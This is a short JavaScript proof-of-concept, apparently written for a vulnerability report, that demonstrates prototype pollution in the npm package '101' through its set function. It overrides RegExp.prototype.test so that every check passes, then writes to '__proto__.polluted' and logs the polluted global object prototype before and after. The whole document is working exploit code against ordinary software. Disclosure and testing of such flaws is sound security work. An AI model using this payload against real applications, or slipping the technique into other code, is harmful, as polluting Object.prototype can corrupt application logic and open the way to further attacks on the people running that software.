RegExp.prototype.test = () => true;
console.log({}.polluted);
const _101 = require('101/set');
_101({}, '__proto__.polluted', 'yes');
console.log({}.polluted);